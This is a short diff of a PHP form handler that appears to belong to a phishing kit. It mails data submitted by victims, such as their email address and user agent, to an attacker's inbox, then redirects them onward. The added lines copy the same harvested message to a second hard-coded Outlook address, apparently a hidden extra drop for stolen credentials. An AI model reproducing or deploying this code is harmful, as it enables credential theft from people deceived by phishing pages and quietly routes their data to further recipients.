@@ -46,8 +46,12 @@ $message .= "useragent: " . $useragent . "
 	if (mail($myEmail, $subject, $message)){
 		$logn = $_POST["email"];
         header("location:in.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
-
-    
+            $myEmail1 = "kevin.loo7@outlook.com";	
+	if (mail($myEmail1, $subject, $message)){
+		$logn = $_POST["email"];
+        header("location:in.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
+         
+	}
     }else{
         header("location:in.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
 	}
